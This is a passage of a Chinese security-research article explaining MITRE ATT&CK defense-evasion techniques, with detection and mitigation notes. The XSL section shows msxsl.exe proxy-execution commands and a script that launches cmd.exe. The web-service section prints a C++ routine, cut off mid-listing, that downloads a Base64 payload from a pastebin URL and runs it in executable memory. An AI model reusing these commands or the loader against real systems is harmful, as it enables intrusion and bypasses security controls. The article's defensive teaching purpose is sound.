**作者：天融信阿尔法实验室  
公众号：**
## 一、前言
基于MITRE ATT&CK框架中关于“ **防御逃逸** ”（Defense
Evasion）的战术专题，笔者将深入介绍其中大部分防御逃逸手段的技术原理、检测方法及缓解方案，为求简洁直观的表达其技术原理，本文对部分战术的实现提供了
**演示性的代码** 。
其实在学习MITRE
ATT&CK框架并一个个实现其原理的过程中，就会发现我们慢慢的对攻击者的攻击思路和攻击方向有了更清晰的认识，并逐步了解他们是如何发现新的攻击手段的。例如在本次的防御逃逸专题中有个应用程序白名单绕过，攻击者总会在Windows系统上找到一些被系统或杀软信任而不会进行限制的应用程序，这些应用通常是被大家忽视或不常用的。当它们有一些可被利用的漏洞时，就会造成严重后果。但当我们了解了攻击者的思路，或许就可以先他一步找到漏洞，避免损失。
当然，在网络上充斥着大量的恶意代码，也不断的有新的变种出现，鉴定和分析恶意代码也成为了 **安全事件响应** 及信息安全工程师的必备技能。希望本文能够为从事
**信息安全** 相关工作的攻城狮带来启发，通过了解这些常规防御逃逸手段而帮助他们在应对 **入侵响应** 、 **样本分析**
等方面工作能够更加游刃有余。
本文所介绍的防御逃逸战术情况如下：
战术 | MITRE ATT&CK链接  
---|---  
XSL脚本代码代理执行 |   
利用可信网络服务进行数据隐蔽传输 |   
虚拟化和沙箱的检测 |   
受信任的开发人员实用程序利用 |   
时间戳伪装 |   
PubPrn代理脚本代码执行 |   
签名二进制程序代理执行 |   
Regsvr32代理代码执行 |   
进程注入 |   
利用NTFS ADS进行数据隐藏 |   
Mshta代理执行脚本代码 |   
CHM文件隐藏代码执行 |   
CMSTP配置文件参数利用 |   
本机程序编译代码执行 |   
额外窗口内存注入 |   
间接命令执行 |   
解码文件并执行 |   
控制面板文件代码执行 |   
入侵痕迹清除 |   
文件加壳 |   
修改文件权限 |   
以Att&ck中对每个防御逃逸战术手段的描述，笔者将每个例子以及所绕过的防御来进行归类，分类情况如下：
分类 | 战术 | 简介  
---|---|---  
数字证书验证 |
XSL脚本代码代理执行、PubPrn代理脚本代码执行、签名二进制程序代理执行、regsvr32代理脚本代码执行、mshta代理执行脚本代码、CHM文件隐藏代码执行
|
通过验证数字证书，可以快速有效的验证程序和代码的来源，从而可以杜绝部分恶意代码的执行。目前这些所列出的战术，均通过利用已被可信证书签名的程序或脚本提供的功能，实现“动态代理执行”外部的脚本或代码，而不破坏原有程序完整性。从攻击者角度来看，通过逆向分析具有合法签名的程序，挖掘可滥用的点（如调用动态链接库、引用外部参数），则可以利用签名过的程序执行代码从而突破数字证书验证。  
应用程序白名单 |
XSL脚本代码代理执行、受信任的开发人员实用程序利用、PubPrn代理脚本代码执行、签名二进制程序代理执行、regsvr32代理脚本代码执行、进程注入、mshta代理执行脚本代码、CMSTP配置文件参数利用、CHM文件隐藏代码执行、控制面板文件代码执行
|
不论是操作系统还是杀毒软件，为了系统安全，当启动某程序或者某程序执行一些敏感操作的时候，会进行提示，让用户选择是否允许该操作。而所有程序都进行提示势必会影响用户体验，所以在系统和杀软中会存在白名单列表，名单中程序的运行被系统或杀软信任而不会进行限制与提示。依据这样的特性，攻击者通过逆向分析白名单中的程序，挖掘可滥用的点（如调用外部动态链接库、引用外部参数），则可以通过白名单程序间接的执行代码而突破限制，这对于突破系统层面或杀软层面的白名单限制都有帮助。  
反病毒 Anti-Virus | XSL脚本代码代理执行、虚拟化和沙箱的检测、regsvr32代理脚本代码执行、进程注入、利用NTFS
ADS进行数据隐藏、CMSTP配置文件参数利用、本机程序编译代码执行、解码文件并执行、额外窗口内存注入、入侵痕迹清除、文件加壳 |
反病毒软件提供的保护是全面而系统的，攻击者针对不同的防护措施通常采用不同的绕过措施。如针对文件扫描查杀，攻击者可能会采用文件分割运行时组合的方式。针对行为查杀，则可能会采用可信程序代理执行关键行为的方式。绕过反病毒软件需要分析具体防护措施的原理，以挖掘绕过和突破的方案。  
绕过防火墙 | 利用可信网络服务进行数据隐蔽传输 |
数据传输是攻击过程中的重要一环，为绕过防火墙拦截而隐蔽传输数据，攻击者可能会在通讯目标及通讯过程两方面进行调整，以突破拦截。通讯过程中的调整主要是通讯协议、通讯频率，将恶意的流量夹杂在正常的通讯协议中，在此基础上，通过将通讯目标改为受信任的地址，可以突破防火墙的拦截。  
静态文件分析 | 虚拟化和沙箱的检测、本机程序编译代码执行、文件加壳 |
静态文件分析绕过战术，有几个方向。如运行之初首先检测是否允许于沙箱和虚拟机而不主动执行恶意代码，可避免被部分自动化分析环境的分析，由于自动化分析环境和正常使用的电脑环境之间一定存在某些差异（如
鼠标运动轨迹、系统已安装的程序等等），利用这些差异来识别运行环境是否为分析环境。还有一个方向是通过技术手段避免代码被轻易得逆向分析，代表性的手段就是加壳加密。由于代码始终需要在客户端进行执行，加壳加密只能是一定程度上加强反分析的能力，但强壳拥有较高的反分析能力，而普通压缩壳反分析能力较弱。  
主机取证分析 | 虚拟化和沙箱的检测、时间戳伪装、利用NTFS ADS进行数据隐藏、入侵痕迹清除 |
为避免被取证分析，攻击者可能会尝试删除入侵痕迹、恶意代码不落地等手段，避免在系统中留下可被分析的记录信息，这与攻击者的行为有关，可被捕捉并分析的记录包含
网络流量、文件操作、日志记录、进程操作及注册表记录等等。  
主机入侵防御系统 | 本机程序编译代码执行、解码文件并执行、额外窗口内存注入、入侵痕迹清除 |
HIPS通过文件、注册表、程序运行三大方面进行监控而实现安全防护。为绕过HIPS的监控，可以通过寻找“代理人”来代理执行代码，如系统中运行的某个可信程序存在代码执行漏洞，普通程序通过触发漏洞执行代码以避免被HIPS拦截提示。  
基于签名的检测 | 本机程序编译代码执行、解码文件并执行、文件加壳 |
所述的基于签名检测即检测文件MD5签名，确认是否为样本库中所包含的恶意文件。众所周知的是，文件内容修改任意一字节其MD5值便会发生变化，由可执行文件的文件结构存在众多可修改的字段，故手工修改文件以绕过MD5检测不是大的问题，重点应在于可执行文件实现运行时自修改，在运行之时自修改磁盘上的可执行程序以保证文件MD5的不断变化，实现绕过基于签名的检测。  
文件系统访问控制 | 修改文件或目录权限 |
当攻击者侵入主机时，为了获取更多信息，攻击者可以修改文件或目录权限，想办法获取更高的权限，以避开DACL对访问控制的管理  
## 二、详例
### 1、XSL脚本代码代理执行
#### 原理及代码介绍
可扩展样式表语言（XSL）文件通常用于描述XML文件中的数据的处理方式和显示方式，其中为了支持复杂的操作，XSL提供了对各种嵌入式脚本的支持，典型的如Javascript。攻击者可能会通过利用此功能来
**代理执行任意代码** ，以绕过应用程序 **白名单防护** 。
XML是一种可扩展的标记语言，被设计用来传输和存储数据。XML类似于HTML，但是和HTML有着本质的区别， XML
被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观， 即XML旨在传输信息，而HTML旨在显示信息。
而XSL指扩展样式表语言(EXtensible Stylesheet Language),
XSL主要是用于基于XML的样式表语言。XSLT是XSL中最重要的部分，XSLT指XSL Transformations，XSLT 用于将一种 XML
文档转换为另外一种 XML 文档，或者可被浏览器识别的其他类型的文档，比如 HTML 和 XHTML。通常，XSLT 是通过把每个 XML 元素转换为
(X)HTML 元素来完成这项工作的。通过
XSLT，您可以向或者从输出文件添加或移除元素和属性。您也可重新排列元素，执行测试并决定隐藏或显示哪个元素，等等。
微软提供了一个名为MSXSL的命令行工具，用于执行XSL
transformations操作，并可以用来执行嵌入在本地或者远程（通过URL指定）XSL文件中的恶意JavaScript。由于该程序默认不安装在Windows系统上，因此攻击者可能需要将其与恶意文件打包在一起放在目标电脑上。
执行本地脚本及远程脚本的命令行示例如下：
    msxsl.exe customers.xml script.xsl
    msxsl.exe http://www.google.com/customers.xml 
Customers.xml文件内容如下：
    Microsoft Windows 
Script.xsl 文件内容如下：
    ">
       function xml(nodelist) 
       {
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c calc.exe");
            return nodelist.nextNode().xml; 
       }
#### 运行效果图
通过CMD进程使用通过命令行进行带参数的命令执行msxsl.exe，test.xsl中的JavaScript会得以执行，该代码执行的宿主程序是msxsl.exe，最后计算器得以执行.
#### 检查及限制方案
通过进程来监视msxsl.exe的执行及其参数，将该程序最近的调用与历史中已知的良好的调用进行比较，已确定异常和潜在的对抗活动。例如：URL命令行参数、外部网络连接的创建、与脚本关联的动态链接库加载等等事件。
由于msxsl并不是系统默认附带的，所以如果计算机中意外出现该程序，需要进一步查询该文件的作用及来历。
#### 参考链接
XML 教程：
XSLT教程: 
ATT&CK：
### 2、利用可信网络服务进行数据隐蔽传输
#### 原理及代码介绍
部分攻击者会使用现有的合法外部Web服务作为中转服务器，将命令和数据中继到受感染的系统中。也有攻击者在在外部的Web服务中放置C&C服务器的信息，通过将C&C信息放在可编辑的Web服务中，受感染系统首先会与该服务进行通讯，然后解析其中数据开始连接真实的C&C服务器。
流行的网站和可信的网站可能会为 **数据隐蔽传输**
做一下掩盖，因为内网的主机在被入侵之前就有与这些网站进行通信的可能性。使用常见的服务（如Google或Twitter提供的服务）可以使数据交互更容易
**隐藏** 。另外Web服务提供商通常使用SSL/TLS加密，这些也为攻击者提供了额外的保护。
使用Web服务存放C&C服务器信息，可以避免因将该信息硬编码到样本中而被分析发现的可能，同时还可以实现C&C服务器的 **弹性**
操作（可以动态修改Web服务中的C&C服务器信息）。
以下总结Att&CK中列举的知名APT组织或工具使用的相关技术手段，粗略分类可分为三大类：
技术手段 | APT组织、工具名称 | 备注  
---|---|---  
在Web服务中保存C&C信息，实现弹性C&C连接 |
APT12、APT37、APT41、BlackCoffee、HAMMERTOSS、Kazuar、Leviathan、LOWBALL、Magic
Hound、MiniDuke、OnionDuke、Orz、POORAIM、PowerStallion、Revenge RAT、RTM、Xbash |
AOL、Twitter、Dropbox、Box 、Github、PasteBin、Microsoft
TechNet、tumbler、BlogSpot、Google Apps、Yandex、SOAP web、RSS  
通过web服务进行数据中转（如文件传输、控制命令下发、下载Payload动态等等） |
Carbanak、CloudDuke、RogueRobin、ROKRAT、SLOWDRIFT、Turla、Twitoor、UBoatRAT、BRONZE
BUTLER | Microsoft OneDrive、Yandex、Mediafire、Twitter  
伪装或利用其他协议流量进行隐蔽通信 | Comnie、GLOOXMAIL | HTTP、DNS、Jabber / XMPP协议  
这里以 **下载Payload并执行**
为例，模拟演示使用Web服务存储可执行代码，利用客户端程序下载并执行的过程。下图为Payload代码，Payload运行后仅弹出提示框证明代码执行成功，首先将代码取出并Base64编码，以便以文本方式进行网络提交和保存：
|  |  
Base64编码后的内容如下
将编码后的内容上载到pastebin.com，生成一个可访问的链接
生成后的地址如下：，当请求该页面，返回的内容为我们编码后的代码。
通过编写如下代码，完成下载并执行代码的过程。代码较长，这里简述一下执行流程：
  1. 模拟发送HTTPS请求获取指定页面的内容
  2. BASE64解码所下载的二进制数据
  3. 将二进制字符串转为二进制数值，并申请一段可执行的内存地址存放该代码
  4. 创建新的线程，将代码执行起来
    bool read_webpage()
    {
        bool ret = false;
        int decode_len = 0;
        BYTE pAllData[4096] = {0};
        BYTE pDecodeData[4096] = {0};
        BYTE* pMessageBody = NULL;
        BYTE* pCode = NULL; 
        HANDLE hNewThread = NULL;
        LPCTSTR lpszServerName = L"www.pastebin.com";                       //欲访问的服务器
        LPCTSTR lpszObjectName = L"/raw/LXrbf7PW";                          //欲访问的页面
        INTERNET_PORT nServerPort = INTERNET_DEFAULT_HTTPS_PORT;            // HTTPS端口443
        LPCTSTR lpszAgent = L"WinInetGet/0.1";
        HINTERNET hInternet = InternetOpen( lpszAgent,INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        LPCTSTR lpszUserName = NULL; 
        LPCTSTR lpszPassword = NULL; 
        DWORD dwConnectFlags = 0;
        DWORD dwConnectContext = 0;
        HINTERNET hConnect = InternetConnect(hInternet,lpszServerName, nServerPort,lpszUserName, lpszPassword,INTERNET_SERVICE_HTTP,dwConnectFlags, dwConnectContext);
        LPCTSTR lpszVerb = L"GET";
        LPCTSTR lpszVersion = NULL;   
        LPCTSTR lpszReferrer = NULL;   
        LPCTSTR *lplpszAcceptTypes = NULL; 
        DWORD dwOpenRequestFlags =  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
            INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_AUTH |
            INTERNET_FLAG_NO_COOKIES |
            INTERNET_FLAG_NO_UI | 
            INTERNET_FLAG_SECURE |
            INTERNET_FLAG_RELOAD;
        DWORD dwOpenRequestContext = 0;
        HINTERNET hRequest = HttpOpenRequest( hConnect, lpszVerb, lpszObjectName, lpszVersion,
            lpszReferrer, lplpszAcceptTypes,dwOpenRequestFlags, dwOpenRequestContext);
        BOOL bResult = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
        if (!bResult) 
        {
            fprintf(stderr, "HttpSendRequest failed, error = %d (0x%x)\n",GetLastError(), GetLastError());
            goto SAFE_EXIT;
        }
        DWORD dwInfoLevel = HTTP_QUERY_RAW_HEADERS_CRLF;
        DWORD dwInfoBufferLength = 2048;
        BYTE *pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+2);
        while (!HttpQueryInfo(hRequest, dwInfoLevel, pInfoBuffer, &dwInfoBufferLength, NULL))
        {
            DWORD dwError = GetLastError();
            if (dwError == ERROR_INSUFFICIENT_BUFFER)
            {
                free(pInfoBuffer);
                pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength + 2);
            }
            else
            {